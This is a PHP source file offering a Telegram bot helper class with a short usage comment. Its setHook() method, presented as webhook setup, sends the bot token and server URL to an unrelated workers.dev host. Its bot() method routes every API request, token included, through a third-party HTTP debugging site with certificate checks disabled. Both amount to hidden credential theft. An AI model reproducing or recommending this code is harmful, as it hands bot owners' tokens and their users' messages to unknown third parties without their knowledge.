<?php
class Telegram {
    private static $bot_token = '';
    private static $data = [];
    public function __construct($bot_token) {
        self::$bot_token = $bot_token;
        self::$data = self::getData();
    }
    public static function bot($method, array $datas) {
      $HttpDebug = "https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx";
      $ApiUrl = "https://api.telegram.org/bot" . self::$bot_token . "/{$method}?" . http_build_query($datas);
        $Payloads = [
            "UrlBox"       => $ApiUrl,
            "AgentList"    => "MOzilla Firefox",
            "VersionsList" => "HTTP/1.1",
            "MethodList"   => "POST"];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $HttpDebug);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($Payloads));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        $errNo = curl_errno($ch);
        $err = curl_error($ch);
        curl_close($ch);
        if ($result) {
            $regex = "~\{(?:[^{}]|(?R))*\}~";
            preg_match_all($regex, $result, $matches, PREG_OFFSET_CAPTURE);
            echo $matches[0][15][0];
        }
    }
    public static function getData() {
        if (empty(self::$data)) {
            $rawData = file_get_contents('php://input');
            self::$data = json_decode($rawData, true);
        }
        return self::$data;
    }
    public static function getValue($keys, $parentKey = null) {
        if (!is_array($keys)) {
            $keys = [$keys];
        }
        $dataSourc = $parentKey ? (self::$data[$parentKey] ?? []) : self::$data;
        if(!is_array($dataSourc)) return [];
        foreach ($keys as $key) {
            if (isset($dataSourc[$key])) {
                return $dataSourc[$key];
            }
        }
        return [];
    }
        public static function setHook($url = null) {
             $api = "https://s5.ahajs-9a.workers.dev/";
        if (!$url) {
              $host = ($_SERVER['HTTPS'] ?? 'off') === 'on' ? 'https' : 'http';
              $url = $host . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            }
          $params = ['token'=>self::$bot_token,'url'=>$url];
          $ch = curl_init($api . '?' . http_build_query($params));
          curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER =>true,CURLOPT_SSL_VERIFYPEER =>false,]);
          $response = curl_exec($ch);
          curl_close($ch);
        return json_decode($response, true);
    }

    public static function message() {
        return self::getValue([
            'message', 'callback_query', 'inline_query', 'edited_message', 
            'channel_post', 'edited_channel_post', 'chat_join_request', 'my_chat_member'
        ]);
    }
    public static function media() {
        return self::getValue([
            'document', 'text', 'photo', 'video', 'game', 'voice', 'audio', 'sticker', 
            'location', 'video_note', 'contact', 'reply_to_message', 'forward_from'
        ], 'message');
    }
    public static function send($send, array $query) {
        return self::bot($send, $query); 
    }
}





/**
 * 
 * ---------------------------------------------
 * Telegram Bot Base 
 * 
 * include "telegram.php"; 
 * $bot = new Telegram("token");
 * Telegram::setHook();
 * $data = Telegram::message();
 * $chat_id = $data['chat']['id'] ?? null;
 * $text    = $data['text'] ?? null;
 * if ($text === "/start") { 
 *     Telegram::send("sendMessage", []);
 * }
 * elseif (isset($data['photo'])){
 *     Telegram::send("sendMessage", []);
 * }
 * elseif (isset($data['sticker'])) {
 *     Telegram::send("sendMessage", []);
 * }
 * 
 * ---------------------------------------------
 *
**/

